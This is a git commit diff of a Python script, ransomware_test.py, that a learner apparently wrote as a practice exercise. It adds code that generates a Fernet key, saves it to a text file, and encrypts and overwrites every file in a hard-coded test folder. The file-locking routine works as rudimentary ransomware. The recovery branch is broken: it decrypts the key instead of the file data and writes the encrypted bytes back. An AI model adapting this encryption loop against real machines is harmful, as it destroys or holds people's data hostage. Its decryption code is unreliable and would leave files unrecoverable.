2aa2b019bca60c3d12442db1d414ed5813a3cc01
m7mdleaf-del <m7mdleaf@gmail.com>
2026-04-02 14:32:07 -0700

    added stuff

--- ransomware_test.py
+++ ransomware_test.py
@@ -1,5 +1,13 @@
-# the orighnal goal is  to learn so im gonna wrrite it all my own 
+# the orighnal goal is  to learn so im gonna wrrite it all my own with the help of
+#  ai to only and only teach me and make me learn better not to Cntl C+V
 import os
+from cryptography.fernet import Fernet 
+key = Fernet.generate_key() # create a key 
+# Change directory to your test folder
+os.chdir(r"C:\Users\M\Desktop\testtty") #! the folder for testing 
+
+fernet = Fernet(key)
+
 # item=os.path.isfile(".")
 All = os.listdir()
 print(type(All))
@@ -20,8 +28,25 @@ for item in All:
             data=f.read()
             print (f"size of {item} and {data} bytes ")
 
-        with open(full_path,'wb') as f:
-            data = b'JPG' + data[1:]  # made the pic not reachubel i dont know changed byts and shit 
+    # Run this ONCE before the loop
+        with open("the_secret_key.txt", "wb") as f:
+             f.write(key)
+             print("[KEY] Saved to disk!")
 
-            res=f.write(data)
-            print(f"Locked {item}: {res} bytes written")
+        # Inside your loop for each .jpg file:
+        with open(full_path, 'rb') as f:
+            data = f.read() # 1. Read
+
+        encrypted_data = fernet.encrypt(data) # 2. Encrypt
+
+        with open(full_path, 'wb') as f:
+            f.write(encrypted_data) # 3. Write (Overwrite original)
+
+        if input() == "yes " and item.endswith(".jpg") :
+                with open("the_secret_key.txt",'rb') as f:
+                    data=f.read(key)
+                    print ("read the coded data  ")
+
+                with open(full_path, 'wb') as f:#? whats the full path wantrs here 
+                    dncrypted_data = fernet.decrypt(key)
+                    f.write(encrypted_data) # 3. Write (Overwrite original)
